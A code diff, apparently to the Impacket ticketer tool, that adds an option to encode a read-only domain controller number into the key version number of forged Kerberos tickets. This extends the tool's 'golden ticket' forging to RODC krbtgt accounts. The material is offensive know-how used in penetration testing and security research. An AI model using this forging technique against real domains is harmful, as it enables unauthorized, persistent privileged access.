@@ -97,6 +97,7 @@ class TICKETER:
         self.__options = options
         self.__tgt = None
         self.__tgt_session_key = None
+        self.__rodcNo = getattr(options, 'rodcNo', None)
         if options.spn:
             spn = options.spn.split('/')
             self.__service = spn[0]
@@ -108,6 +109,14 @@ class TICKETER:
         else:
             self.__service = 'krbtgt'
             self.__server = self.__domain
+
+        if self.__rodcNo:
+            logging.info('RODC golden ticket mode: kvno will be encoded with RODC number %d' % self.__rodcNo)
+
+    def _encode_kvno(self, base_kvno):
+        if self.__rodcNo:
+            return (self.__rodcNo << 16) | base_kvno
+        return base_kvno
 
     @staticmethod
     def getFileTime(t):
@@ -438,7 +447,7 @@ class TICKETER:
                 kdcRep['ticket']['sname']['name-string'][1] = self.__server
 
             kdcRep['ticket']['enc-part'] = noValue
-            kdcRep['ticket']['enc-part']['kvno'] = 2
+            kdcRep['ticket']['enc-part']['kvno'] = self._encode_kvno(2)
             kdcRep['enc-part'] = noValue
             if self.__options.nthash is None:
                 if len(self.__options.aesKey) == 64:
@@ -451,7 +460,7 @@ class TICKETER:
                 kdcRep['ticket']['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value
                 kdcRep['enc-part']['etype'] = EncryptionTypes.rc4_hmac.value
 
-            kdcRep['enc-part']['kvno'] = 2
+            kdcRep['enc-part']['kvno'] = self._encode_kvno(2)
             kdcRep['enc-part']['cipher'] = noValue
 
         pacInfos = self.createBasicPac(kdcRep)
@@ -1049,7 +1058,7 @@ class TICKETER:
         cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)
 
         kdcRep['ticket']['enc-part']['cipher'] = cipherText
-        kdcRep['ticket']['enc-part']['kvno'] = 2
+        kdcRep['ticket']['enc-part']['kvno'] = self._encode_kvno(2)
 
         # Lastly.. we have to encrypt the kdcRep['enc-part'] part
         # with a key we chose. It actually doesn't really matter since nobody uses it (could it be trash?)
@@ -1074,7 +1083,7 @@ class TICKETER:
 
         kdcRep['enc-part']['cipher'] = cipherText
         kdcRep['enc-part']['etype'] = cipher.enctype
-        kdcRep['enc-part']['kvno'] = 1
+        kdcRep['enc-part']['kvno'] = self._encode_kvno(1)
 
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('Final Golden Ticket')
@@ -1130,6 +1139,8 @@ if __name__ == '__main__':
                                                                              '(default = 24*365*10)')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-rodcNo', action='store', type=int, help='Number of the RODC krbtgt account '
+                        '(e.g. 8245 for krbtgt_8245). Encodes the RODC number into the ticket kvno')
 
     group = parser.add_argument_group('authentication')
 
